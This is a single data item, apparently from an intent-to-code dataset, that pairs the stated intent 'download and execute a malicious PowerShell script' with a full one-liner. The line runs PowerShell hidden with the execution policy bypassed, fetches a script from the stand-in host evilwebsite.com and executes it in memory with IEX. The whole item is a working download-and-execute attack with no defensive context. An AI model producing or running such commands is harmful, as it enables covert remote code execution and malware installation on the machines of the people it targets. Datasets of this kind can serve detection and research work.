# Natural language intent:
# Download and execute a malicious PowerShell script from a hidden window with Bypass execution policy.

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evilwebsite.com')"
